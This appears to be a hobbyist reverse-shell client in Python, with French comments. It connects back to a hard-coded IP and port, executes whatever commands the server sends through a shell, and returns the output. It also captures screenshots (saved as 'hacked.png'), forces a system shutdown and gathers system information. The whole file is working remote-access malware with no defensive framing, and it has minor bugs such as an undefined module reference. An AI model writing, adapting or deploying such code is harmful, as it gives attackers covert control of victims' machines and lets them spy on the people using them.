import os
import subprocess
import platform
import socket
import time
import io
from PIL import ImageGrab
from colorama import Fore, Style
import modules.system_info as mod_info 


#=====HOST INFO====#
HOST = "192.168.43.212"
PORT = 12345
#==================#
DATA_SIZE = 1024

x = mod_info.send_os()


def get_sys_info(socket_param):
    try:
        info = modules.system_info.send_os()
        #print (f"information = {info}")
    except Exception as error:
        print(f"{error}")

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
    except ConnectionRefusedError: 
        print(f"{Fore.RED}[-] ACCESS DENIED , SERVER REFUSING CONNECTION...{Style.RESET_ALL}")
        time.sleep(1)
    else:
        print("[+] Connected IP:{0} | PORT: {1}".format(HOST, PORT))
        break
 
while True:
    prompt_info = x + "@" + os.getcwd()
    s.sendall(prompt_info.encode())#envoyer prompt

    commande = s.recv(DATA_SIZE)  #recevoir le commande du serveur 
    commande_decode = commande.decode()#commande_decode = commande decodé

    commande_split = commande_decode.split(' ')

    if commande_decode == "info":
        commande_decode = platform.platform()

    elif len(commande_split) == 2 and commande_split[0] == "cd":
        try:
            os.chdir(commande_split[1])
        except FileNotFoundError:
            print("ERROR: Files Don't exists") 


#==============================================
#               Commande LIST BEGIN                       #
#==============================================

    elif commande_decode == "shutdown":
        commande_decode = "shutdown /s /t 0" #Pour windows uniquement
        print("arrêt system")

    elif commande_decode == "screenshot":
        output_file = "hacked.png"#filename

        screenshot = ImageGrab.grab()
        screenshot.save(output_file)
        print(f"Saved to: {output_file}")

        print('screenshoot success....')

    if commande_decode == "ip":
        commande_decode = 'ifconfig'


#==============================================
#               COMMANDE LIST END                   #
#==============================================

    resultat = subprocess.run(commande_decode, shell = True, capture_output = True, universal_newlines = True)
    r = resultat.stdout
    s.sendall(r.encode())



s.close()
